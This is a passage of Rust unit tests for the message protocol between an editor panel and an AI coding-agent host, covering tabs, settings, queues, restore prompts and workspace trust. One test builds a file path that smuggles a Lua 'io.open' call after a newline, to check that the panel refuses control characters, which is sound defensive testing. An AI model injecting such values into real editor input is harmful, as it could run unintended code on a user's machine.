            std::path::PathBuf::from("/tmp/project"),
        );
        let parsed: Value = serde_json::from_str(&serialize_hello_for_js(&greeting)).unwrap();
        assert_eq!(parsed["backend"], "legacy");
        assert_eq!(parsed["permissionModes"], json!(["manual", "auto", "bypass"]));
        assert_eq!(
            parsed["resumableSessions"],
            json!([]),
            "the legacy backend can never offer a resume"
        );
        assert!(parsed["expectedVerdandiRevision"].is_null());
    }

    #[test]
    fn task_commands_parse_and_the_output_reply_keeps_its_request_tab_and_task() {
        for kind in ["stop_task", "task_output"] {
            let raw = json!({"type": kind, "request_id": "q1", "tab": 4, "task_id": "task"});
            let message = parse_inbound_message(&raw.to_string()).unwrap();
            assert_eq!(message.request_id(), "q1");
            assert_eq!(message.tab_ref(), TabRef::Named(TabId(4)));
            assert!(
                matches!(message, InboundMessage::StopTask { task_id, .. } | InboundMessage::TaskOutput { task_id, .. } if task_id == "task")
            );
            let missing = json!({"type": kind, "request_id": "q1", "task_id": "task"});
            assert_eq!(
                parse_inbound_message(&missing.to_string()).unwrap().tab_ref(),
                TabRef::Missing
            );
            assert!(parse_inbound_message(&json!({"type": kind, "request_id": "q1", "tab": 4}).to_string()).is_none());
        }
        let output = agent::TaskOutput {
            output: "�<b>plain</b>".into(),
            total_bytes: 9000,
            truncated: true,
            offset: 1000,
        };
        let wire: Value = serde_json::from_str(&serialize_task_output_for_js("q1", TabId(4), "task", &output)).unwrap();
        assert_eq!(
            wire,
            json!({"kind": "task_output_result", "requestId": "q1", "tab": 4, "taskId": "task",
            "output": "�<b>plain</b>", "totalBytes": 9000, "truncated": true, "offset": 1000})
        );
        let ranged = json!({"type": "task_output", "request_id": "q1", "tab": 4, "task_id": "t", "offset": 12});
        assert!(matches!(
            parse_inbound_message(&ranged.to_string()).unwrap(),
            InboundMessage::TaskOutput { offset: Some(12), .. }
        ));
    }

    #[test]
    fn the_direct_settings_parse_with_their_tab_and_their_replies_keep_it() {
        for raw in [
            json!({"type": "list_models", "request_id": "q1", "tab": 4}),
            json!({"type": "set_model", "request_id": "q1", "tab": 4, "model": "sonnet"}),
            json!({"type": "apply_effort", "request_id": "q1", "tab": 4, "effort": "low"}),
        ] {
            let message = parse_inbound_message(&raw.to_string()).unwrap();
            assert_eq!(message.request_id(), "q1");
            assert_eq!(message.tab_ref(), TabRef::Named(TabId(4)));
        }
        let applied = agent::AppliedSettings {
            model: "claude-sonnet-5-5".into(),
            effort: "low".into(),
        };
        let wire: Value = serde_json::from_str(&serialize_applied_for_js("q1", TabId(4), &applied)).unwrap();
        assert_eq!(
            wire,
            json!({"kind": "settings_result", "requestId": "q1", "tab": 4,
                "applied": {"model": "claude-sonnet-5-5", "effort": "low"}})
        );
        let list = agent::ModelList {
            models: vec![agent::ModelOption {
                value: "sonnet".into(),
                supports_auto_mode: true,
                supported_effort_levels: vec!["low".into()],
                ..Default::default()
            }],
            applied,
        };
        let wire: Value = serde_json::from_str(&serialize_models_for_js("q1", TabId(4), &list)).unwrap();
        assert_eq!(wire["kind"], "models_result");
        assert_eq!(wire["models"][0]["supportsAutoMode"], true);
        assert_eq!(wire["models"][0]["supportedEffortLevels"][0], "low");
        assert_eq!(wire["applied"]["effort"], "low");
    }

    #[test]
    fn a_tab_command_parses_and_says_which_tab_it_names() {
        let named = parse_inbound_message(r#"{"type":"send_message","request_id":"r1","tab":3,"text":"hi"}"#).unwrap();
        assert!(matches!(named.tab_ref(), TabRef::Named(TabId(3))));
        // Parsing preserves requestId so a request naming no tab can receive a refusal.
        let missing = parse_inbound_message(r#"{"type":"interrupt","request_id":"r2"}"#).unwrap();
        assert_eq!(missing.request_id(), "r2");
        assert!(matches!(missing.tab_ref(), TabRef::Missing));
        let window = parse_inbound_message(r#"{"type":"ready","request_id":"r3"}"#).unwrap();
        assert!(matches!(window.tab_ref(), TabRef::WindowLevel));
        let permission = parse_inbound_message(
            r#"{"type":"permission_response","request_id":"r4","tab":1,"permission_id":"p","decision":"allow"}"#,
        )
        .unwrap();
        assert!(matches!(permission.tab_ref(), TabRef::Named(TabId(1))));
    }

    /// The confirmed stop of a tab's background names its tab and the count its question showed; one
    /// that names no tab is refused like every other tab command, and one without the count does not
    /// parse, so no answer is taken for a question whose count is unknown.
    #[test]
    fn a_stop_of_the_background_names_its_tab_and_the_count_it_was_asked_about() {
        let named =
            parse_inbound_message(r#"{"type":"stop_background","request_id":"s1","tab":4,"running":2}"#).unwrap();
        assert!(matches!(named.tab_ref(), TabRef::Named(TabId(4))));
        assert_eq!(named.request_id(), "s1");
        assert!(matches!(named, InboundMessage::StopBackground { running: 2, .. }));
        let missing = parse_inbound_message(r#"{"type":"stop_background","request_id":"s2","running":1}"#).unwrap();
        assert!(matches!(missing.tab_ref(), TabRef::Missing));
        assert!(parse_inbound_message(r#"{"type":"stop_background","request_id":"s3","tab":4}"#).is_none());
    }

    #[test]
    fn the_new_tab_messages_parse() {
        for (json, want) in [
            (r#"{"type":"select_tab","request_id":"a","tab":2}"#, "select_tab"),
            (
                r#"{"type":"rename_tab","request_id":"a","tab":2,"name":"docs"}"#,
                "rename_tab",
            ),
            (r#"{"type":"close_tab","request_id":"a","tab":2}"#, "close_tab"),
            (r#"{"type":"reset_tab","request_id":"a","tab":2}"#, "reset_tab"),
            (r#"{"type":"cycle_mode","request_id":"a","tab":2}"#, "cycle_mode"),
            (r#"{"type":"open_detail","request_id":"a","tab":2}"#, "open_detail"),
            (
                r#"{"type":"resume","request_id":"a","tab":2,"provider_session_id":"c-1"}"#,
                "resume",
            ),
        ] {
            let message = parse_inbound_message(json).unwrap_or_else(|| panic!("{want} did not parse"));
            assert!(matches!(message.tab_ref(), TabRef::Named(TabId(2))), "{want}");
        }
        assert!(
            parse_inbound_message(r#"{"type":"start_session","request_id":"a","mode":"auto"}"#).is_none(),
            "start_session is gone: the first message starts the session"
        );
    }

    #[test]
    fn every_session_envelope_carries_its_tab() {
        let tab = TabId(7);
        let events: serde_json::Value = serde_json::from_str(&serialize_events_for_js(tab, 1, 2, &[])).unwrap();
        assert_eq!(events["tab"], 7);
        let error: serde_json::Value = serde_json::from_str(&serialize_error_for_js(tab, "gone")).unwrap();
        assert_eq!(
            error,
            serde_json::json!({ "kind": "error", "tab": 7, "message": "gone" })
        );
        let focus: serde_json::Value = serde_json::from_str(&serialize_focus_permission_for_js(tab)).unwrap();
        assert_eq!(focus, serde_json::json!({ "kind": "focus_permission", "tab": 7 }));
        let rename: serde_json::Value =
            serde_json::from_str(&serialize_begin_rename_for_js(tab, Some("docs"))).unwrap();
        assert_eq!(
            rename,
            serde_json::json!({ "kind": "begin_rename", "tab": 7, "current": "docs" })
        );
        let confirm: serde_json::Value = serde_json::from_str(&serialize_confirm_close_for_js(
            tab,
            &["close 1 \"new\"? (y/n)".to_string()],
        ))
        .unwrap();
        assert_eq!(confirm["lines"][0], "close 1 \"new\"? (y/n)");
        let command =
            agent::handoff::ClaudeResumeCommand::for_session("/home/user/project", "1857dcd5-973b-46a2").unwrap();
        let handoff: serde_json::Value = serde_json::from_str(&serialize_handoff_for_js(tab, &command)).unwrap();
        assert_eq!(handoff["tab"], 7);
        assert_eq!(handoff["providerSessionId"], "1857dcd5-973b-46a2");
    }

    #[test]
    fn toggle_following_parses_and_names_its_tab() {
        let message: InboundMessage =
            serde_json::from_str(r#"{"type":"toggle_following","request_id":"follow-1","tab":3}"#).unwrap();
        assert!(matches!(message, InboundMessage::ToggleFollowing { tab: Some(3), .. }));
        assert_eq!(message.request_id(), "follow-1");
        assert!(matches!(message.tab_ref(), TabRef::Named(crate::tabs::TabId(3))));
    }

    #[test]
    fn a_following_tab_says_so_and_another_says_nothing() {
        let mut tabs = crate::tab_set::TabSet::new(crate::agent_backend::BackendKind::Sidecar, SessionModeChoice::Auto);
        let first = tabs.active();
        tabs.get_mut(first).unwrap().following = true;
        tabs.open(crate::agent_backend::AgentId::Claude);
        let value: Value = serde_json::from_str(&tabs.tabs_payload()).unwrap();
        assert_eq!(value["tabs"][0]["following"], true);
        assert!(value["tabs"][1].get("following").is_none());
    }

    #[test]
    fn the_tabs_envelope_lists_every_tab_with_its_marker_and_the_active_one() {
        let tabs = [
            TabView {
                following: false,
                question_draft: Default::default(),
                id: TabId(1),
                number: 1,
                label: "1 fix-parser".into(),
                name: Some("fix-parser".into()),
                state: TabStateWire::Live,
                mode: SessionModeChoice::Auto,
                marker: Some(Marker::NeedsInput(2)),
                pending: 2,
                resumable: true,
                failure: None,
                failed_after_start: false,
                resumes_on_r: false,
                title: Some("fix the parser".into()),
                agent: "claude".into(),
            },
            TabView {
                following: false,
                question_draft: Default::default(),
                id: TabId(4),
                number: 2,
                label: "2 new".into(),
                name: None,
                state: TabStateWire::Failed,
                mode: SessionModeChoice::Bypass,
                marker: Some(Marker::Ended),
                pending: 0,
                resumable: false,
                failure: Some("the gate refused".into()),
                failed_after_start: true,
                resumes_on_r: true,
                title: None,
                agent: "codex".into(),
            },
        ];
        let value: serde_json::Value =
            serde_json::from_str(&serialize_tabs_for_js(TabId(4), &tabs, SessionModeChoice::Bypass)).unwrap();
        assert_eq!(value["kind"], "tabs");
        assert_eq!(value["active"], 4);
        assert_eq!(value["defaultMode"], "bypass");
        assert_eq!(
            value["tabs"][0],
            serde_json::json!({
                "id": 1, "number": 1, "label": "1 fix-parser", "name": "fix-parser", "state": "live",
                "mode": "auto", "marker": "needs_input", "pending": 2, "resumable": true, "failure": null,
                "failedAfterStart": false, "resumesOnR": false, "title": "fix the parser", "agent": "claude"
            })
        );
        assert_eq!(value["tabs"][1]["agent"], "codex");
        assert_eq!(value["tabs"][1]["failedAfterStart"], true);
        assert_eq!(value["tabs"][1]["resumesOnR"], true);
        assert_eq!(value["tabs"][1]["state"], "failed");
        assert_eq!(value["tabs"][1]["marker"], "ended");
        assert_eq!(value["tabs"][1]["name"], serde_json::Value::Null);
        assert_eq!(value["tabs"][1]["title"], serde_json::Value::Null);
    }

    #[test]
    fn a_manual_tab_and_a_manual_default_are_sent_as_manual() {
        let tabs = vec![TabView {
            following: false,
            question_draft: Default::default(),
            id: TabId(1),
            number: 1,
            label: "1 new".into(),
            name: None,
            state: TabStateWire::NotStarted,
            mode: SessionModeChoice::Manual,
            marker: None,
            pending: 0,
            resumable: false,
            failure: None,
            failed_after_start: false,
            resumes_on_r: false,
            title: None,
            agent: "claude".into(),
        }];
        let value: Value =
            serde_json::from_str(&serialize_tabs_for_js(TabId(1), &tabs, SessionModeChoice::Manual)).unwrap();
        assert_eq!(value["defaultMode"], "manual");
        assert_eq!(value["tabs"][0]["mode"], "manual");
    }

    #[test]
    fn the_chooser_lists_open_tabs_then_records_and_marks_those_held_elsewhere() {
        let open = [ChooserTab {
            tab: TabId(1),
            label: "1 docs".into(),
            marker: None,
            pending: 0,
            resumable: true,
        }];
        let records = [ChooserRecord {
            provider_session_id: "c-9".into(),
            name: None,
            title: Some("fix the picker".into()),
            created_at: "1".into(),
            updated_at: "2".into(),
            held_elsewhere: true,
            held_by_partner: false,
            partner_window: None,
        }];
        let value: serde_json::Value = serde_json::from_str(&serialize_chooser_for_js(&open, &records)).unwrap();
        assert_eq!(value["kind"], "chooser");
        assert_eq!(value["open"][0]["tab"], 1);
        assert_eq!(value["open"][0]["marker"], serde_json::Value::Null);
        assert_eq!(value["records"][0]["providerSessionId"], "c-9");
        assert_eq!(value["records"][0]["heldElsewhere"], true);
        let detail: serde_json::Value = serde_json::from_str(&serialize_tab_detail_for_js(
            TabId(1),
            &[DetailRow {
                label: "account".into(),
                value: "work".into(),
            }],
        ))
        .unwrap();
        assert_eq!(
            detail,
            serde_json::json!({ "kind": "tab_detail", "tab": 1, "rows": [{ "label": "account", "value": "work" }] })
        );
    }

    #[test]
    fn hello_carries_each_sessions_name_or_null() {
        let mut greeting = crate::agent_backend::BackendGreeting::for_kind(
            crate::agent_backend::BackendKind::Legacy,
            std::path::PathBuf::from("/home/user/project"),
        );
        greeting.resumable = vec![agent::ResumableSession {
            provider: "claude".into(),
            provider_session_id: "c-1".into(),
            created_at: "1".into(),
            updated_at: "2".into(),
            title: None,
            name: Some("docs".into()),
        }];
        let value: serde_json::Value = serde_json::from_str(&serialize_hello_for_js(&greeting)).unwrap();
        assert_eq!(value["resumableSessions"][0]["name"], "docs");
    }

    #[test]
    fn the_phase_three_messages_parse_and_name_their_tab_or_none() {
        for (json, tab_scoped) in [
            (
                r#"{"type":"queue_message","request_id":"a","tab":2,"text":"later"}"#,
                true,
            ),
            (r#"{"type":"take_back_queue","request_id":"a","tab":2}"#, true),
            (r#"{"type":"send_now","request_id":"a","tab":2,"text":""}"#, true),
            (
                r#"{"type":"draft","request_id":"a","tab":2,"text":"half a thou"}"#,
                true,
            ),
            (r#"{"type":"edit_draft","request_id":"a","tab":2,"text":"draft"}"#, true),
            (r#"{"type":"history_push","request_id":"a","text":"cleared"}"#, false),
            (
                r#"{"type":"open_path","request_id":"a","path":"src/main.rs","line":42}"#,
                false,
            ),
            (r#"{"type":"open_path","request_id":"a","path":"src/main.rs"}"#, false),
            (
                r#"{"type":"view_in_editor","request_id":"a","title":"Bash","text":"out"}"#,
                false,
            ),
            (
                r#"{"type":"view_proposal","request_id":"a","path":"a.rs","change":{"kind":"content","content":""}}"#,
                false,
            ),
        ] {
            let message = parse_inbound_message(json).unwrap_or_else(|| panic!("{json} did not parse"));
            assert_eq!(message.request_id(), "a");
            if tab_scoped {
                assert!(matches!(message.tab_ref(), TabRef::Named(TabId(2))), "{json}");
            } else {
                assert!(matches!(message.tab_ref(), TabRef::WindowLevel), "{json}");
            }
        }
        let untabbed = parse_inbound_message(r#"{"type":"queue_message","request_id":"b","text":"x"}"#).unwrap();
        assert!(matches!(untabbed.tab_ref(), TabRef::Missing), "never the active one");
    }

    /// A proposal crosses the bridge in either shape, its path kept byte for byte so the panel's refusal sees
    /// what the agent sent; a shape this build does not know does not parse, and a path holding a control
    /// character is one the panel refuses before looking at the disk.
    #[test]
    fn view_proposal_parses_and_refuses_a_control_character_path() {
        let edits = parse_inbound_message(
            r#"{"type":"view_proposal","request_id":"v","path":"src/a.rs","change":{"kind":"edits","edits":[{"oldText":"a","newText":"b","replaceAll":true}]}}"#,
        )
        .unwrap();
        match edits {
            InboundMessage::ViewProposal { path, change, .. } => {
                assert_eq!(path, "src/a.rs");
                assert_eq!(
                    change,
                    ProposedChange::Edits {
                        edits: vec![ProposedEdit {
                            old_text: "a".into(),
                            new_text: "b".into(),
                            replace_all: true,
                        }],
                        crlf_as_lf: false,
                    }
                );
            }
            other => panic!("{other:?}"),
        }
        let claude = parse_inbound_message(
            r#"{"type":"view_proposal","request_id":"v","path":"a.rs","change":{"kind":"edits","edits":[{"oldText":"a","newText":"b","replaceAll":false}],"crlfAsLf":true}}"#,
        )
        .unwrap();
        assert!(matches!(
            claude,
            InboundMessage::ViewProposal {
                change: ProposedChange::Edits { crlf_as_lf: true, .. },
                ..
            }
        ));
        let content = parse_inbound_message(
            r#"{"type":"view_proposal","request_id":"v","path":"new.rs","change":{"kind":"content","content":"fn main() {}\n"}}"#,
        )
        .unwrap();
        assert!(matches!(
            content,
            InboundMessage::ViewProposal { change: ProposedChange::Content { ref content }, .. } if content == "fn main() {}\n"
        ));
        for unknown in [
            r#"{"type":"view_proposal","request_id":"v","path":"a.rs","change":{"kind":"delete"}}"#,
            r#"{"type":"view_proposal","request_id":"v","path":"a.rs","change":{"kind":"edits"}}"#,
            r#"{"type":"view_proposal","request_id":"v","path":"a.rs"}"#,
        ] {
            assert!(parse_inbound_message(unknown).is_none(), "{unknown}");
        }
        let hostile = parse_inbound_message(
            r#"{"type":"view_proposal","request_id":"v","path":"a\nlua(io.open)('x','w')","change":{"kind":"content","content":""}}"#,
        )
        .unwrap();
        let InboundMessage::ViewProposal { path, .. } = hostile else {
            panic!("a control character is data to the parser")
        };
        assert_eq!(path, "a\nlua(io.open)('x','w')");
        assert!(path_holds_control(&path));
        for c in ['\0', '\r', '\t', '\x1b', '\x7f'] {
            assert!(path_holds_control(&format!("a{c}b.rs")), "{c:?}");
        }
        assert!(!path_holds_control("src/main.rs"));
        assert!(!path_holds_control("/abs/naïve file.rs"));
    }

    /// What a name can do to whatever shows it, past the ASCII range: a C1 control is read as one by a terminal, a bidi
    /// control reorders what the person reads, and the two separators end a line.
    #[test]
    fn a_control_past_ascii_is_a_control() {
        for c in [
            '\u{80}', '\u{85}', '\u{9b}', '\u{9f}', '\u{61c}', '\u{200e}', '\u{200f}', '\u{2028}', '\u{2029}',
            '\u{202a}', '\u{202b}', '\u{202c}', '\u{202d}', '\u{202e}', '\u{2066}', '\u{2067}', '\u{2068}', '\u{2069}',
        ] {
            assert!(path_holds_control(&format!("a{c}b.rs")), "{:x}", c as u32);
        }
        for name in [
            "src/日本語.rs",
            "a\u{a0}b.rs",
            "a\u{200d}b.rs",
            "café 🙂.rs",
            "\u{fffd}.rs",
        ] {
            assert!(!path_holds_control(name), "{name:?}");
        }
    }

    #[test]
    fn remember_defaults_to_false_and_is_read_when_sent() {
        let plain = parse_inbound_message(
            r#"{"type":"permission_response","request_id":"r","tab":1,"permission_id":"p","decision":"allow"}"#,
        )
        .unwrap();
        assert!(matches!(
            plain,
            InboundMessage::PermissionResponse { remember: false, .. }
        ));
        let remembered = parse_inbound_message(
            r#"{"type":"permission_response","request_id":"r","tab":1,"permission_id":"p","decision":"allow","remember":true}"#,
        )
        .unwrap();
        assert!(matches!(
            remembered,
            InboundMessage::PermissionResponse { remember: true, .. }
        ));
    }

    #[test]
    fn the_phase_three_envelopes_have_their_exact_shapes() {
        use crate::tab_set::{Queued, QueuedState};
        let tab = TabId(4);
        let mut steered = Queued::held("look at the parser too", "ctx\n\nlook at the parser too".into(), 12);
        steered.state = QueuedState::Steered {
            client_id: "eitri-4-1".into(),
            sent_at_ms: 12,
        };
        let queue = [
            steered,
            Queued::held("and the tests", "ctx\n\nand the tests".into(), 17),
        ];
        let value = |s: String| -> Value { serde_json::from_str(&s).unwrap() };
        assert_eq!(
            value(serialize_queue_for_js(
                tab,
                &queue,
                Some("refused"),
                Some("held until the turn ends: why"),
                Some(true)
            )),
            json!({ "kind": "queue", "tab": 4, "items": [
                { "text": "look at the parser too", "queuedAt": 12, "steered": true },
                { "text": "and the tests", "queuedAt": 17, "steered": false },
            ], "error": "refused", "note": "held until the turn ends: why", "enterSteers": true }),
            "the wire text (with its context) and the client id never go to the panel"
        );
        assert_eq!(
            value(serialize_draft_for_js(tab, "half")),
            json!({ "kind": "draft", "tab": 4, "text": "half" })
        );
        assert_eq!(
            value(serialize_late_draft_for_js(tab, "half")),
            json!({ "kind": "draft", "tab": 4, "text": "half", "late": true })
        );
        assert_eq!(
            value(serialize_queue_taken_for_js(tab, &["a".into(), "b".into()])),
            json!({ "kind": "queue_taken", "tab": 4, "texts": ["a", "b"] })
        );
        assert_eq!(
            value(serialize_history_for_js(&["old".into(), "new".into()])),
            json!({ "kind": "history", "entries": ["old", "new"] })
        );
        let mut offers = std::collections::BTreeMap::new();
        offers.insert(
            "perm-1".to_string(),
            agent::PrefixRule::parse("Bash(git push *)").unwrap(),
        );
        assert_eq!(
            value(serialize_rule_offers_for_js(tab, &offers)),
            json!({ "kind": "rule_offers", "tab": 4, "offers": { "perm-1": "git push *" } })
        );
        assert_eq!(
            value(serialize_editor_context_for_js(Some(&ContextSummary {
                file: "src/a.rs".into(),
                lines: Some((10, 20))
            }))),
            json!({ "kind": "editor_context", "file": "src/a.rs", "lines": [10, 20] })
        );
        assert_eq!(
            value(serialize_editor_context_for_js(None)),
            json!({ "kind": "editor_context", "file": null, "lines": null })
        );
        assert_eq!(
            value(serialize_scratch_for_js(tab, true)),
            json!({ "kind": "scratch", "tab": 4, "editing": true })
        );
        assert_eq!(
            value(serialize_notice_for_js("no such file")),
            json!({ "kind": "notice", "text": "no such file" })
        );
    }

    #[test]
    fn the_context_line_names_a_project_file_relatively_and_only_a_real_selection() {
        use crate::editor_context::{EditorContext, Selection};
        let root = std::path::Path::new("/home/user/project");
        let inside = EditorContext {
            file: "/home/user/project/src/parser.rs".into(),
            selection: None,
        };
        assert_eq!(
            context_summary(Some(&inside), root),
            Some(ContextSummary {
                file: "src/parser.rs".into(),
                lines: None
            })
        );
        let selected = EditorContext {
            file: "/etc/hosts".into(),
            selection: Some(Selection {
                start_line: 3,
                end_line: 9,
                text: "x".into(),
            }),
        };
        assert_eq!(
            context_summary(Some(&selected), root),
            Some(ContextSummary {
                file: "/etc/hosts".into(),
                lines: Some((3, 9))
            })
        );
        let unnamed = EditorContext {
            file: String::new(),
            selection: None,
        };
        assert_eq!(
            context_summary(Some(&unnamed), root),
            None,
            "a buffer with no file says nothing"
        );
        assert_eq!(context_summary(None, root), None);
    }

    /// The snapshot omits `modeSwitch` because the CLI mode never switches. Absence keeps a panel
    /// from mistaking a false capability value for a live response about mode switching.
    #[test]
    fn a_snapshot_carries_no_mode_switch_capability() {
        let projection = AgentSessionProjection::default();
        let view = SnapshotView {
            backend: "sidecar",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities: agent::ProviderCapabilities {
                interactive_permission_mode: true,
                bypass_permission_mode: true,
                ..Default::default()
            },
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        let capabilities = parsed["state"]["capabilities"].as_object().unwrap();
        assert!(!capabilities.contains_key("modeSwitch"), "{capabilities:?}");
    }

    #[test]
    fn a_snapshot_carries_each_offered_task_capability() {
        let projection = AgentSessionProjection::default();
        for offered in [false, true] {
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: None,
                provider_session_id: None,
                capabilities: agent::ProviderCapabilities {
                    background_tasks: offered,
                    task_control: offered,
                    task_output: offered,
                    workflow_progress: offered,
                    ..Default::default()
                },
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
                hidden_pending: None,
            };
            let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
            for field in ["backgroundTasks", "taskControl", "taskOutput", "workflowProgress"] {
                assert_eq!(
                    parsed["state"]["capabilities"][field].as_bool().unwrap_or(false),
                    offered
                );
            }
        }
    }

    #[test]
    fn hello_carries_what_the_launch_may_bring_back_or_null() {
        let greeting = greeting_with(Vec::new());
        let value: Value = serde_json::from_str(&serialize_hello_for_js(&greeting)).unwrap();
        assert!(value["restore"].is_null(), "present, and null when nothing is on offer");
        let offer = crate::tab_restore::RestoreOffer {
            labels: vec!["api".to_string(), "docs".to_string()],
            bypass: 1,
            cut_note: Some("a turn was cut off".to_string()),
        };
        let value: Value = serde_json::from_str(&serialize_hello_with_restore_for_js(&greeting, Some(&offer))).unwrap();
        assert_eq!(
            value["restore"],
            json!({ "labels": ["api", "docs"], "bypass": 1, "cutNote": "a turn was cut off" })
        );
        assert_eq!(value["kind"], "hello", "the rest of the hello is the same");
        let none: Value = serde_json::from_str(&serialize_hello_with_restore_for_js(&greeting, None)).unwrap();
        assert!(none["restore"].is_null());
    }

    #[test]
    fn the_restore_messages_parse_and_know_their_tab() {
        let last = parse_inbound_message(r#"{"type":"restore_last","request_id":"r1","tab":3}"#).unwrap();
        assert!(
            matches!(last.tab_ref(), TabRef::Named(TabId(3))),
            "it is about the tab it was pressed in"
        );
        assert_eq!(last.request_id(), "r1");
        let missing = parse_inbound_message(r#"{"type":"restore_last","request_id":"r1"}"#).unwrap();
        assert!(matches!(missing.tab_ref(), TabRef::Missing), "never \"the active one\"");

        let answer =
            parse_inbound_message(r#"{"type":"restore_answer","request_id":"r2","nonce":9,"keep_bypass":false}"#)
                .unwrap();
        assert!(matches!(answer.tab_ref(), TabRef::WindowLevel));
        assert_eq!(answer.request_id(), "r2");
        match answer {
            InboundMessage::RestoreAnswer { nonce, keep_bypass, .. } => assert_eq!((nonce, keep_bypass), (9, false)),
            other => panic!("expected RestoreAnswer, got {other:?}"),
        }
        // No default for either: an answer with no nonce, or no yes/no, is a protocol error and
        // never read as "the current prompt" or "yes".
        assert!(parse_inbound_message(r#"{"type":"restore_answer","request_id":"r","keep_bypass":true}"#).is_none());
        assert!(parse_inbound_message(r#"{"type":"restore_answer","request_id":"r","nonce":1}"#).is_none());
        assert!(
            parse_inbound_message(r#"{"type":"restore_answer","request_id":"r","nonce":"1","keep_bypass":true}"#)
                .is_none()
        );
    }

    #[test]
    fn the_restore_question_envelope_matches_the_wire_contract() {
        let prompt = crate::tab_set::RestorePrompt {
            nonce: 5,
            lines: vec![
                "Restore 3 tabs (1 in bypass)? y/n".to_string(),
                "n brings the bypass tab back in auto".to_string(),
            ],
        };
        assert_eq!(
            serde_json::from_str::<Value>(&serialize_confirm_restore_for_js(&prompt)).unwrap(),
            json!({
                "kind": "confirm_restore",
                "nonce": 5,
                "lines": ["Restore 3 tabs (1 in bypass)? y/n", "n brings the bypass tab back in auto"],
            })
        );
    }

    #[test]
    fn editor_link_envelope_shape() {
        let parsed: serde_json::Value =
            serde_json::from_str(&serialize_editor_link_for_js("detached", "editor detached: x")).unwrap();
        let object = parsed.as_object().unwrap();
        assert_eq!(object.len(), 3);
        assert_eq!(object["kind"], "editor_link");
        assert_eq!(object["state"], "detached");
        assert_eq!(object["text"], "editor detached: x");
    }
    // ---- the workspace-trust protocol ----

    const TRUST_ANSWER: &str = r#"{"type":"trust_answer","request_id":"r9","tab":3,"nonce":17,"fingerprint":"ab12","findings_digest":"cd34","trust":true}"#;
    const TRUST_CANCEL: &str = r#"{"type":"trust_cancel","request_id":"r10","tab":3,"nonce":17}"#;

    #[test]
    fn trust_answer_deserializes() {
        match parse_inbound_message(TRUST_ANSWER).unwrap() {
            InboundMessage::TrustAnswer {
                request_id,
                tab,
                nonce,
                fingerprint,
                findings_digest,
                trust,
            } => {
                assert_eq!((request_id.as_str(), tab, nonce), ("r9", 3, 17));
                assert_eq!((fingerprint.as_str(), findings_digest.as_str()), ("ab12", "cd34"));
                assert!(trust);
            }
            other => panic!("expected TrustAnswer, got {other:?}"),
        }
        let no = TRUST_ANSWER.replace(r#""trust":true"#, r#""trust":false"#);
        assert!(matches!(
            parse_inbound_message(&no),
            Some(InboundMessage::TrustAnswer { trust: false, .. })
        ));
        // Every field is required: an answer that does not say what it answers is not parsed.
        for missing in [
            r#""tab":3,"#,
            r#""nonce":17,"#,
            r#""fingerprint":"ab12","#,
            r#""findings_digest":"cd34","#,
            r#","trust":true"#,
        ] {
            let line = TRUST_ANSWER.replace(missing, "");
            assert_ne!(line, TRUST_ANSWER, "{missing}");
            assert!(parse_inbound_message(&line).is_none(), "{line}");
        }
        assert!(parse_inbound_message(&TRUST_ANSWER.replace(r#""tab":3"#, r#""tab":null"#)).is_none());
        assert!(parse_inbound_message(&TRUST_ANSWER.replace(r#""trust":true"#, r#""trust":"yes""#)).is_none());
    }

    #[test]
    fn trust_cancel_deserializes() {
        assert!(matches!(
            parse_inbound_message(TRUST_CANCEL).unwrap(),
            InboundMessage::TrustCancel { tab: 3, nonce: 17, .. }
        ));
        for missing in [r#""tab":3,"#, r#","nonce":17"#] {
            let line = TRUST_CANCEL.replace(missing, "");
            assert_ne!(line, TRUST_CANCEL, "{missing}");
            assert!(parse_inbound_message(&line).is_none(), "{line}");
        }
    }

    #[test]
    fn trust_command_deserializes() {
        for (word, want) in [("trust", TrustAction::Trust), ("untrust", TrustAction::Untrust)] {
            let line = format!(r#"{{"type":"trust_command","request_id":"r11","action":"{word}","agent":"codex"}}"#);
            match parse_inbound_message(&line).unwrap() {
                InboundMessage::TrustCommand {
                    request_id,
                    action,
                    agent,
                } => {
                    assert_eq!(request_id, "r11");
                    assert_eq!(action, want);
                    assert_eq!(agent, "codex");
                }
                other => panic!("expected TrustCommand, got {other:?}"),
            }
        }
        assert!(parse_inbound_message(r#"{"type":"trust_command","request_id":"r11","action":"always"}"#).is_none());
        assert!(parse_inbound_message(r#"{"type":"trust_command","request_id":"r11"}"#).is_none());
        // Without the agent it was typed for, the command cannot be told from one for another tab.
        assert!(parse_inbound_message(r#"{"type":"trust_command","request_id":"r11","action":"trust"}"#).is_none());
    }

    #[test]
    fn trust_messages_have_request_ids() {
        let lines = [
            TRUST_ANSWER,
            TRUST_CANCEL,
            r#"{"type":"trust_command","request_id":"r11","action":"trust","agent":"claude"}"#,
        ];
        let ids: Vec<String> = lines
            .iter()
            .map(|line| parse_inbound_message(line).unwrap().request_id().to_owned())
            .collect();
        assert_eq!(ids, ["r9", "r10", "r11"]);
    }

    /// Tab routing: an answer is for the tab it names,
    /// through `TabSet::resolve`.
    #[test]
    fn trust_answer_naming_no_tab_or_a_gone_tab_is_refused() {
        let set = crate::tab_set::TabSet::new(crate::agent_backend::BackendKind::Sidecar, SessionModeChoice::Auto);
        let live = set.active().0;
        for template in [TRUST_ANSWER, TRUST_CANCEL] {
            let present = template.replace(r#""tab":3"#, &format!(r#""tab":{live}"#));
            let message = parse_inbound_message(&present).unwrap();
            assert_eq!(set.resolve(message.tab_ref()), Ok(Some(set.active())), "{present}");

            let gone = template.replace(r#""tab":3"#, r#""tab":777"#);
            let message = parse_inbound_message(&gone).unwrap();
            assert!(matches!(message.tab_ref(), TabRef::Named(TabId(777))));
            let why = set.resolve(message.tab_ref()).unwrap_err();
            assert!(why.contains("no tab 777"), "{why}");

            let nameless = template.replace(r#""tab":3,"#, "");
            assert!(
                parse_inbound_message(&nameless).is_none(),
                "naming no tab does not parse: {nameless}"
            );
        }
    }

    #[test]
    fn trust_command_is_window_level() {
        for word in ["trust", "untrust"] {
            let line = format!(r#"{{"type":"trust_command","request_id":"r11","action":"{word}","agent":"claude"}}"#);
            assert!(matches!(
